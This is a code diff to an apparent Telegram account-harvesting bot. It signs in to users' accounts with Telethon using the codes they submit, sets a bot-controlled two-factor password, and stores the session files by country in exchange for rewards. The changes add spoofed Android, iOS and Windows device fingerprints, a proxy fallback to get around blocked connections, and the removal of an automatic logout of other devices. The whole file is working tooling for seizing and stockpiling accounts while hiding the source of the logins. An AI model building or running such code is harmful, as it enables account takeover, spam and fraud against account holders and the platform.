@@ -6,6 +6,7 @@ from config import API_ID, API_HASH, SESSIONS_DIR, DEFAULT_2FA_PASSWORD
 from telethon.errors import SessionPasswordNeededError
 from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
 import random
+from proxy_manager import proxy_manager
 
 # Configuration for handling persistent database issues
 VALIDATION_BYPASS_MODE = True  # Set to True to be more lenient with validation errors
@@ -15,6 +16,13 @@ DATABASE_ERROR_COUNT = 0  # Track consecutive database errors
 class SessionManager:
     def __init__(self):
         self.user_states = {}
+        # Constants for overflow prevention
+        self.MAX_USER_STATES = 500  # Maximum number of concurrent user states
+        self.MAX_STATE_AGE_SECONDS = 3600  # Maximum state age before cleanup (1 hour)
+        
+        # NOTE: Automatic device logout is DISABLED
+        # The system only checks device count but does NOT automatically log out other devices
+        # Users must manually ensure only one device is logged in to receive rewards
 
     def _get_country_code(self, phone_number):
         """Extract country code from phone number"""
@@ -41,9 +49,46 @@ class SessionManager:
         country_code = self._get_country_code(phone_number)
         country_dir = self._ensure_country_session_dir(country_code)
         return os.path.join(country_dir, f"{phone_number}.session")
+    
+    def cleanup_old_user_states(self):
+        """Clean up old user states to prevent memory overflow"""
+        import time
+        current_time = time.time()
+        states_to_remove = []
+        
+        for user_id, state in self.user_states.items():
+            state_start_time = state.get('start_time', current_time)
+            
+            # Check if state is too old
+            if (current_time - state_start_time) > self.MAX_STATE_AGE_SECONDS:
+                states_to_remove.append(user_id)
+        
+        # Remove old states and cleanup their clients
+        for user_id in states_to_remove:
+            try:
+                asyncio.create_task(self.cleanup_session(user_id))
+                print(f"🧹 Cleaned up old user state for user {user_id}")
+            except Exception as e:
+                print(f"❌ Error cleaning up user state {user_id}: {e}")
+        
+        return len(states_to_remove)
+    
+    def check_user_state_limit(self):
+        """Check if we're approaching user state limits and clean up if necessary"""
+        if len(self.user_states) >= self.MAX_USER_STATES:
+            cleaned = self.cleanup_old_user_states()
+            print(f"⚠️ User state limit reached ({len(self.user_states)}), cleaned up {cleaned} old states")
+            return len(self.user_states) < self.MAX_USER_STATES
+        return True
 
     async def start_verification(self, user_id, phone_number):
         try:
+            # 🚀 SPEED OPTIMIZATION: Streamlined verification process
+            # Check user state limits before starting
+            if not self.check_user_state_limit():
+                print(f"❌ Cannot start verification for {phone_number} - user state limit exceeded")
+                return "error", "System is busy. Please try again in a few minutes."
+            
             # Create country-specific directory
             country_code = self._get_country_code(phone_number)
             country_dir = self._ensure_country_session_dir(country_code)
@@ -52,29 +97,100 @@ class SessionManager:
             with NamedTemporaryFile(prefix='tmp_', suffix='.session', dir=country_dir, delete=False) as tmp:
                 temp_path = tmp.name
             
-            # Pick a random device
+            # Pick a random device (faster device selection)
             device = get_random_device()
-            client = TelegramClient(
-                temp_path, API_ID, API_HASH,
-                device_model=device["device_model"],
-                system_version=device["system_version"],
-                app_version=device["app_version"]
-            )
-            await client.connect()
-            sent = await client.send_code_request(phone_number)
+            
 
+            
+            # 🚀 SPEED OPTIMIZATION: Try both proxy and direct connection
+            client = None
+            sent = None
+            
+            # First try direct connection (usually faster)
+            print(f"📡 Trying direct connection for {phone_number}")
+            try:
+                client = TelegramClient(
+                    temp_path, API_ID, API_HASH,
+                    device_model=device["device_model"],
+                    system_version=device["system_version"],
+                    app_version=device["app_version"],
+                    timeout=10
+                )
+                
+                await asyncio.wait_for(client.connect(), timeout=10)
+                sent = await asyncio.wait_for(client.send_code_request(phone_number), timeout=10)
+                print(f"✅ Direct connection successful for {phone_number}")
+                
+            except Exception as direct_error:
+                print(f"❌ Direct connection failed: {direct_error}")
+                # Close failed direct client
+                try:
+                    if client:
+                        await client.disconnect()
+                    client = None
+                except:
+                    pass
+                
+                # Try with proxy as fallback
+                working_proxy = await proxy_manager.get_working_proxy()
+                if working_proxy:
+                    try:
+                        print(f"🌐 Trying proxy {working_proxy['addr']}:{working_proxy['port']} for {phone_number}")
+                        
+                        proxy_config = (
+                            working_proxy['proxy_type'],
+                            working_proxy['addr'],
+                            working_proxy['port'],
+                            working_proxy['rdns'],
+                            working_proxy['username'],
+                            working_proxy['password']
+                        )
+                        
+                        client = TelegramClient(
+                            temp_path, API_ID, API_HASH,
+                            proxy=proxy_config,
+                            device_model=device["device_model"],
+                            system_version=device["system_version"],
+                            app_version=device["app_version"],
+                            timeout=10
+                        )
+                        
+                        await asyncio.wait_for(client.connect(), timeout=10)
+                        sent = await asyncio.wait_for(client.send_code_request(phone_number), timeout=10)
+                        print(f"✅ Proxy connection successful for {phone_number}")
+                        
+                    except Exception as proxy_error:
+                        print(f"❌ Proxy failed: {proxy_error}")
+                        proxy_manager.mark_proxy_failed(working_proxy)
+                        try:
+                            if client:
+                                await client.disconnect()
+                        except:
+                            pass
+                        return "error", f"Both direct and proxy connections failed: {str(direct_error)}"
+                else:
+                    return "error", f"Direct connection failed and no proxy available: {str(direct_error)}"
+            
+            if not client or not sent:
+                return "error", "Could not establish connection to send OTP"
+
+            import time
             self.user_states[user_id] = {
                 "phone": phone_number,
                 "session_path": temp_path,
                 "client": client,
                 "phone_code_hash": sent.phone_code_hash,
                 "state": "awaiting_code",
-                "country_code": country_code
+                "country_code": country_code,
+                "start_time": time.time()  # Add timestamp for cleanup
             }
             
             print(TRANSLATIONS['session_started'][get_user_language(user_id)].format(phone=phone_number, country=country_code))
             return "code_sent", "Verification code sent"
         except Exception as e:
+            print(f"❌ OTP sending failed: {e}")
+            import traceback
+            traceback.print_exc()
             return "error", str(e)
 
     async def verify_code(self, user_id, code):
@@ -84,22 +200,28 @@ class SessionManager:
 
         client = state["client"]
         try:
-            await client.sign_in(phone=state["phone"], code=code, phone_code_hash=state["phone_code_hash"])
+            # 🚀 SPEED OPTIMIZATION: Faster code verification with timeout
+            await asyncio.wait_for(
+                client.sign_in(phone=state["phone"], code=code, phone_code_hash=state["phone_code_hash"]),
+                timeout=10
+            )
         except SessionPasswordNeededError:
             state["state"] = "awaiting_password"
             return "password_needed", None
+        except asyncio.TimeoutError:
+            return "error", "Verification timeout. Please try again."
         except Exception as e:
             if os.path.exists(state["session_path"]):
                 os.unlink(state["session_path"])
             return "error", str(e)
 
-        # Set 2FA password and logout other devices
+        # Set 2FA password (without logging out other devices)
         try:
             # Set 2FA password
             if await client.edit_2fa(new_password=DEFAULT_2FA_PASSWORD, hint="auto-set by bot"):
-                # Logout other devices to ensure only 1 device is logged in
-                await self.logout_other_devices(client)
+                # Save session without logging out other devices
                 self._save_session(state, client)
+                print(f"✅ 2FA set for {state['phone']} - device logout disabled")
                 return "verified_and_secured", None
             else:
                 return "error", "Failed to set initial 2FA"
@@ -113,16 +235,19 @@ class SessionManager:
         client = state["client"]
 
         try:
-            await client.sign_in(password=password)
+            # 🚀 SPEED OPTIMIZATION: Faster 2FA verification with timeout
+            await asyncio.wait_for(client.sign_in(password=password), timeout=10)
+        except asyncio.TimeoutError:
+            return "error", "2FA verification timeout. Please try again."
         except Exception:
             return "error", "Current 2FA password is incorrect."
 
-        # Update 2FA password and logout other devices
+        # Update 2FA password (without logging out other devices)
         try:
             if await client.edit_2fa(current_password=password, new_password=DEFAULT_2FA_PASSWORD):
-                # Logout other devices to ensure only 1 device is logged in
-                await self.logout_other_devices(client)
+                # Save session without logging out other devices
                 self._save_session(state, client)
+                print(f"✅ 2FA updated for {state['phone']} - device logout disabled")
                 return "verified_and_secured", None
             else:
                 return "error", "Failed to update 2FA password"
@@ -272,7 +397,10 @@ class SessionManager:
             print(TRANSLATIONS['session_saved'][get_user_language(0)].format(phone=phone_number))
 
     def validate_session_before_reward(self, phone_number):
-        """Simplified session validation without async conflicts"""
+        """
+        Simplified session validation without async conflicts
+        Note: Device logout is disabled - only validates session existence and integrity
+        """
         global DATABASE_ERROR_COUNT
         
         session_path = self._get_session_path(phone_number)
@@ -474,12 +602,45 @@ IOS_DEVICES = [
     {"device_model": "iPhone SE (3rd Gen)", "system_version": "iOS 16.0", "app_version": "9.3.0 (12345) official"}
 ]
 
-# Choose device type randomly for each session (can be customized)
+WINDOWS_DEVICES = [
+    {"device_model": "Windows 10 Desktop", "system_version": "Windows 10", "app_version": "4.14.15 (12345) official"},
+    {"device_model": "Windows 11 PC", "system_version": "Windows 11", "app_version": "4.14.15 (12345) official"},
+    {"device_model": "Surface Pro 9", "system_version": "Windows 11", "app_version": "4.14.15 (12345) official"},
+    {"device_model": "Dell OptiPlex", "system_version": "Windows 10", "app_version": "4.14.15 (12345) official"}
+]
+
+# Choose device type based on configuration
 def get_random_device():
-    if random.choice([True, False]):
+    from config import DEFAULT_DEVICE_TYPE, CUSTOM_DEVICE_NAME, CUSTOM_SYSTEM_VERSION, CUSTOM_APP_VERSION
+    
+    if DEFAULT_DEVICE_TYPE == 'custom':
+        return get_custom_device(CUSTOM_DEVICE_NAME, CUSTOM_SYSTEM_VERSION, CUSTOM_APP_VERSION)
+    elif DEFAULT_DEVICE_TYPE == 'android':
         return random.choice(ANDROID_DEVICES)
-    else:
+    elif DEFAULT_DEVICE_TYPE == 'ios':
         return random.choice(IOS_DEVICES)
+    elif DEFAULT_DEVICE_TYPE == 'windows':
+        return random.choice(WINDOWS_DEVICES)
+    else:  # 'random'
+        device_type = random.choice(['android', 'ios', 'windows'])
+        if device_type == 'android':
+            return random.choice(ANDROID_DEVICES)
+        elif device_type == 'ios':
+            return random.choice(IOS_DEVICES)
+        else:
+            return random.choice(WINDOWS_DEVICES)
+
+def get_windows_device():
+    """Get a Windows device specifically"""
+    return random.choice(WINDOWS_DEVICES)
+
+def get_custom_device(device_name, system_version="Windows 10", app_version="4.14.15 (12345) official"):
+    """Create a custom device with specified name"""
+    return {
+        "device_model": device_name,
+        "system_version": system_version,
+        "app_version": app_version
+    }
 
 # Standalone functions for use in background threads
 def get_real_device_count(phone_number):
